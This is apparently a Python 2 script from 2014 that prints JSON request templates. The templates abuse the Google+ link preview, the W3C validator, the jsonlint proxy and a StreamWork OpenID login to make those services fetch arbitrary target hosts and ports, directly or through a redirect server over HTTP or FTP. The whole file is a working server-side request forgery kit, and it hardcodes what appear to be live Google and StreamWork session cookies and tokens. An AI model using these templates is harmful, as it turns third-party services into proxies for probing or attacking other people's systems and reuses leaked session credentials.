'''
Created on Sep 25, 2014

This is an utility to generate the json input for Fritz.

@author: gianko
'''

import json


def googleplus_dir():
    bodyp = {
             "f.req": """["http://{target}:{target_port}/?id={id}",false,false,null,null,null,null,null,null,null,null,null,true]""",
             "at"   : "AObGSAiXHvii6OUaxwEGv_XthFJiY3W0IQ:1411480770763"
             }
    headers = { 
               "Cookie": "NID=67=mPrlKuZwhwbmGQgbjmNZ7ugoAln6sCfElEOSA_Ykwtlt08PdzIIR7T2mm_UDjiQZUwtVLiMDIyhJm_sscdHT8bgCyVI2inGFPsJ2iYudQ9jd037xwt57V0o2QPNGD4C7fm5bwq44yzJLR7Q; SID=DQAAAPMAAAC0VYeOk0sb6GmKs3j_5eGeSc3JTpqSNZAY0jqXfU0BHlmcRQS2tgwozEhnRDnyItNLuwmvrzSlgePVHaQlv5LAMgyxRuWEh6uuGy-N7njB3q95L8udFASTJ6EjhjGY7eZN3V1y5yc4btkBMcNoFBzTDd0qIQHQUW3r6kcWPJk7XvHBJqCs9unYficiuLC98jqH0ZKrwvPidZEdLQttmh3OtlTkivGe-Y_HchX0kqg9sqR2I75yc-RoJcYMz7aFcAWpVJbgvXt4sDp8BOOBdIqBtqG2XgZcDJxyj-w_LunHvyxNDa6JQJByjj_k4ZFFZLDjlgHkD0AL-pjyFqgCM541; HSID=AT8P022tg1oOHrP7g; SSID=A44w0z423cLklj-Uo; APISID=FmOjPQtGNUoBHPJi/AWlhTdx_V59hakvPU; SAPISID=WVdHHE46TdU7c71-/APKvE9trWVGA-GfOk; OTZ=2486280_48_52_123900_48_436380; PREF=ID=b8bcd1d3a9a7441f:FF=0:LD=en:TM=1411480775:LM=1411480775:S=2_Oql1n_n4WMHAPr; llbcs=0; S=talkgadget=x8Upr4PX7WLyfdeFknDMQA",
               "Referer": "https://plus.google.com/",
               "X-Same-Domain": "1",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Accept-Language": "en-US,en;q=0.5",
               "Connection": "keep-alive",
               "Pragma": "no-cache",
               "Cache-Control": "no-cache",
               "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:32.0) Gecko/20100101 Firefox/32.0",
               "content-type": "application/x-www-form-urlencoded; charset=UTF-8"
               }
    
    urlp = """https://plus.google.com/_/sharebox/linkpreview/?soc-app=1&cid=0&soc-platform=1&hl=en&ozv=es_oz_20140918.08_p2&avw=str%3A1&f.sid=-2439825426978519516&_reqid=1757574&rt=j"""
    
    jsonfritz_req = {
                 "method": "POST",
                 "bodyp": bodyp,
                 "headers": headers,
                 "urlp": urlp
                 }
    return jsonfritz_req

def googleplus_red_http():
    bodyp = {
             "f.req": """["http://{red_server}/?target=http://{target}:{target_port}&id={id}",false,false,null,null,null,null,null,null,null,null,null,true]""",
             "at"   : "AObGSAiXHvii6OUaxwEGv_XthFJiY3W0IQ:1411480770763"
             }
    headers = { 
               "Cookie": "NID=67=mPrlKuZwhwbmGQgbjmNZ7ugoAln6sCfElEOSA_Ykwtlt08PdzIIR7T2mm_UDjiQZUwtVLiMDIyhJm_sscdHT8bgCyVI2inGFPsJ2iYudQ9jd037xwt57V0o2QPNGD4C7fm5bwq44yzJLR7Q; SID=DQAAAPMAAAC0VYeOk0sb6GmKs3j_5eGeSc3JTpqSNZAY0jqXfU0BHlmcRQS2tgwozEhnRDnyItNLuwmvrzSlgePVHaQlv5LAMgyxRuWEh6uuGy-N7njB3q95L8udFASTJ6EjhjGY7eZN3V1y5yc4btkBMcNoFBzTDd0qIQHQUW3r6kcWPJk7XvHBJqCs9unYficiuLC98jqH0ZKrwvPidZEdLQttmh3OtlTkivGe-Y_HchX0kqg9sqR2I75yc-RoJcYMz7aFcAWpVJbgvXt4sDp8BOOBdIqBtqG2XgZcDJxyj-w_LunHvyxNDa6JQJByjj_k4ZFFZLDjlgHkD0AL-pjyFqgCM541; HSID=AT8P022tg1oOHrP7g; SSID=A44w0z423cLklj-Uo; APISID=FmOjPQtGNUoBHPJi/AWlhTdx_V59hakvPU; SAPISID=WVdHHE46TdU7c71-/APKvE9trWVGA-GfOk; OTZ=2486280_48_52_123900_48_436380; PREF=ID=b8bcd1d3a9a7441f:FF=0:LD=en:TM=1411480775:LM=1411480775:S=2_Oql1n_n4WMHAPr; llbcs=0; S=talkgadget=x8Upr4PX7WLyfdeFknDMQA",
               "Referer": "https://plus.google.com/",
               "X-Same-Domain": "1",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Accept-Language": "en-US,en;q=0.5",
               "Connection": "keep-alive",
               "Pragma": "no-cache",
               "Cache-Control": "no-cache",
               "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:32.0) Gecko/20100101 Firefox/32.0",
               "content-type": "application/x-www-form-urlencoded; charset=UTF-8"
               }
    
    urlp = """https://plus.google.com/_/sharebox/linkpreview/?soc-app=1&cid=0&soc-platform=1&hl=en&ozv=es_oz_20140918.08_p2&avw=str%3A1&f.sid=-2439825426978519516&_reqid=1757574&rt=j"""
    
    jsonfritz_req = {
                 "method": "POST",
                 "bodyp": bodyp,
                 "headers": headers,
                 "urlp": urlp
                 }
    return jsonfritz_req

def googleplus_red_ftp():
    bodyp = {
             "f.req": """["http://{red_server}/?target=ftp://{target}:{target_port}&id={id}",false,false,null,null,null,null,null,null,null,null,null,true]""",
             "at"   : "AObGSAiXHvii6OUaxwEGv_XthFJiY3W0IQ:1411480770763"
             }
    headers = { 
               "Cookie": "NID=67=mPrlKuZwhwbmGQgbjmNZ7ugoAln6sCfElEOSA_Ykwtlt08PdzIIR7T2mm_UDjiQZUwtVLiMDIyhJm_sscdHT8bgCyVI2inGFPsJ2iYudQ9jd037xwt57V0o2QPNGD4C7fm5bwq44yzJLR7Q; SID=DQAAAPMAAAC0VYeOk0sb6GmKs3j_5eGeSc3JTpqSNZAY0jqXfU0BHlmcRQS2tgwozEhnRDnyItNLuwmvrzSlgePVHaQlv5LAMgyxRuWEh6uuGy-N7njB3q95L8udFASTJ6EjhjGY7eZN3V1y5yc4btkBMcNoFBzTDd0qIQHQUW3r6kcWPJk7XvHBJqCs9unYficiuLC98jqH0ZKrwvPidZEdLQttmh3OtlTkivGe-Y_HchX0kqg9sqR2I75yc-RoJcYMz7aFcAWpVJbgvXt4sDp8BOOBdIqBtqG2XgZcDJxyj-w_LunHvyxNDa6JQJByjj_k4ZFFZLDjlgHkD0AL-pjyFqgCM541; HSID=AT8P022tg1oOHrP7g; SSID=A44w0z423cLklj-Uo; APISID=FmOjPQtGNUoBHPJi/AWlhTdx_V59hakvPU; SAPISID=WVdHHE46TdU7c71-/APKvE9trWVGA-GfOk; OTZ=2486280_48_52_123900_48_436380; PREF=ID=b8bcd1d3a9a7441f:FF=0:LD=en:TM=1411480775:LM=1411480775:S=2_Oql1n_n4WMHAPr; llbcs=0; S=talkgadget=x8Upr4PX7WLyfdeFknDMQA",
               "Referer": "https://plus.google.com/",
               "X-Same-Domain": "1",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Accept-Language": "en-US,en;q=0.5",
               "Connection": "keep-alive",
               "Pragma": "no-cache",
               "Cache-Control": "no-cache",
               "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:32.0) Gecko/20100101 Firefox/32.0",
               "content-type": "application/x-www-form-urlencoded; charset=UTF-8"
               }
    
    urlp = """https://plus.google.com/_/sharebox/linkpreview/?soc-app=1&cid=0&soc-platform=1&hl=en&ozv=es_oz_20140918.08_p2&avw=str%3A1&f.sid=-2439825426978519516&_reqid=1757574&rt=j"""
    
    jsonfritz_req = {
                 "method": "POST",
                 "bodyp": bodyp,
                 "headers": headers,
                 "urlp": urlp
                 }
    return jsonfritz_req

def validator_w3_dir():

    headers = { 
               "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:32.0) Gecko/20100101 Firefox/32.0",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Accept-Language": "en-US,en;q=0.5",
               "Referer": "http://validator.w3.org/"
               }
    
    urlp = """http://validator.w3.org/check"""
    
    queryp = {
              "uri": "http://{target}:{target_port}/?id={id}",
              "charset": "(detect automatically)",
              "doctype": "Inline",
              "group": "0"
              }
    
    jsonfritz_req = {
                 "method": "GET",
                 "queryp": queryp,
                 "headers": headers,
                 "urlp": urlp
                 }
    return jsonfritz_req

def validator_w3_red_http():

    headers = { 
               "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:32.0) Gecko/20100101 Firefox/32.0",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Accept-Language": "en-US,en;q=0.5",
               "Referer": "http://validator.w3.org/"
               }
    
    urlp = """http://validator.w3.org/check"""
    
    queryp = {
              "uri": "http://{red_server}/?target=http://{target}:{target_port}&id={id}",
              "charset": "(detect automatically)",
              "doctype": "Inline",
              "group": "0"
              }
    
    jsonfritz_req = {
                 "method": "GET",
                 "queryp": queryp,
                 "headers": headers,
                 "urlp": urlp
                 }
    return jsonfritz_req

def validator_w3_red_ftp():

    headers = { 
               "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:32.0) Gecko/20100101 Firefox/32.0",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Accept-Language": "en-US,en;q=0.5",
               "Referer": "http://validator.w3.org/"
               }
    
    urlp = """http://validator.w3.org/check"""
    
    queryp = {
              "uri": "http://{red_server}/?target=ftp://{target}:{target_port}&id={id}",
              "charset": "(detect automatically)",
              "doctype": "Inline",
              "group": "0"
              }
    
    jsonfritz_req = {
                 "method": "GET",
                 "queryp": queryp,
                 "headers": headers,
                 "urlp": urlp
                 }
    return jsonfritz_req

def jsonlint_red_http():

    headers = { 
               "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:32.0) Gecko/20100101 Firefox/32.0",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Accept-Language": "en-US,en;q=0.5",
               "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
               
               }
    
    urlp = """http://jsonlint.com/proxy.php"""
        
    bodyp = {
             "url": """http://{red_server}/?target=http://{target}:{target_port}&id={id}"""
             }
        
    jsonfritz_req = {
                 "method": "POST",
                 "headers": headers,
                 "urlp": urlp,
                 "bodyp": bodyp
                 }
    return jsonfritz_req

def jsonlint_red_ftp():

    headers = { 
               "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:32.0) Gecko/20100101 Firefox/32.0",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Accept-Language": "en-US,en;q=0.5",
               "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
               
               }
    
    urlp = """http://jsonlint.com/proxy.php"""
        
    bodyp = {
             "url": """http://{red_server}/?target=ftp://{target}:{target_port}&id={id}"""
             }
        
    jsonfritz_req = {
                 "method": "POST",
                 "headers": headers,
                 "urlp": urlp,
                 "bodyp": bodyp
                 }
    return jsonfritz_req

def streamwork_dir():
    bodyp = {
             "openid_identifier": """http://{target}:{target_port}/?id={id}""",
             "authenticity_token"   : "WMqxoSTseXGWdl/QsixRXvx7Tq4MB7x9W/SutIjcPoE=",
             "commit" : "Log+In",
             "openid_source": "Google+Apps"
             }
    headers = { 
               "Cookie": "12sprints_srv=m59; _cstar_session=5310f4fdebc59136a68a4df656c79323",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Accept-Language": "en-US,en;q=0.5",
               "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:32.0) Gecko/20100101 Firefox/32.0",
               "Content-type": "application/x-www-form-urlencoded"
               }
    
    urlp = """https://streamwork.com/session/open_id_signin"""
    
    jsonfritz_req = {
                 "method": "POST",
                 "bodyp": bodyp,
                 "headers": headers,
                 "urlp": urlp
                 }
    return jsonfritz_req

def streamwork_red_http():
    bodyp = {
             "openid_identifier": """http://{red_server}/?target=http://{target}:{target_port}&id={id}""",
             "authenticity_token"   : "WMqxoSTseXGWdl/QsixRXvx7Tq4MB7x9W/SutIjcPoE=",
             "commit" : "Log+In",
             "openid_source": "Google+Apps"
             }
    headers = { 
               "Cookie": "12sprints_srv=m59; _cstar_session=5310f4fdebc59136a68a4df656c79323",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Accept-Language": "en-US,en;q=0.5",
               "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:32.0) Gecko/20100101 Firefox/32.0",
               "Content-type": "application/x-www-form-urlencoded"
               }
    
    urlp = """https://streamwork.com/session/open_id_signin"""
    
    jsonfritz_req = {
                 "method": "POST",
                 "bodyp": bodyp,
                 "headers": headers,
                 "urlp": urlp
                 }
    return jsonfritz_req

def streamwork_red_ftp():
    bodyp = {
             "openid_identifier": """http://{red_server}/?target=ftp://{target}:{target_port}&id={id}""",
             "authenticity_token"   : "WMqxoSTseXGWdl/QsixRXvx7Tq4MB7x9W/SutIjcPoE=",
             "commit" : "Log+In",
             "openid_source": "Google+Apps"
             }
    headers = { 
               "Cookie": "12sprints_srv=m59; _cstar_session=5310f4fdebc59136a68a4df656c79323",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Accept-Language": "en-US,en;q=0.5",
               "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:32.0) Gecko/20100101 Firefox/32.0",
               "Content-type": "application/x-www-form-urlencoded"
               }
    
    urlp = """https://streamwork.com/session/open_id_signin"""
    
    jsonfritz_req = {
                 "method": "POST",
                 "bodyp": bodyp,
                 "headers": headers,
                 "urlp": urlp
                 }
    return jsonfritz_req

if __name__ == '__main__':

    reqgens = [googleplus_dir, 
                googleplus_red_http,
                googleplus_red_ftp,
                validator_w3_dir,
                validator_w3_red_http,
                validator_w3_red_ftp,
                jsonlint_red_http,
                jsonlint_red_ftp,
                streamwork_dir,
                streamwork_red_http,
                streamwork_red_ftp
                ]

    for r in reqgens:
        print json.dumps(r())

    